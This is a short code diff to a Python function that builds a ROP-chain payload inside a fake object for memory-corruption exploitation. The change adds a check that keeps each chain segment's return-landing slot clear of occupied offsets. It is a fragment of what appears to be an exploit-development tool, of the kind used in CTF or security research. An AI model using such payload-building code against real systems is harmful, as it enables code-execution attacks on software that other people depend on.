@@ -470,8 +470,9 @@ def build_patched_payload(e, rop_chain, pivot, occupied, obj_size=0x100):
     shift_info = []
     current_off = chain_off
 
-    for seg_items in segments:
+    for seg_idx, seg_items in enumerate(segments):
         seg_bytes = len(seg_items) * 8
+        is_last_seg = (seg_idx == len(segments) - 1)
 
         # Ensure current_off is not occupied before placing anything.
         # If the ret-landing after the previous segment is occupied,
@@ -523,6 +524,14 @@ def build_patched_payload(e, rop_chain, pivot, occupied, obj_size=0x100):
                 if off in occupied_set:
                     conflict = off
                     break
+
+            # Also check post-segment ret-landing position: if the
+            # slot right after this segment is occupied, the last ret
+            # would jump into a reserved value instead of the next gadget.
+            if conflict is None and not is_last_seg:
+                post_off = current_off + seg_bytes
+                if post_off in occupied_set:
+                    conflict = post_off
 
             if conflict is None:
                 break  # segment fits cleanly
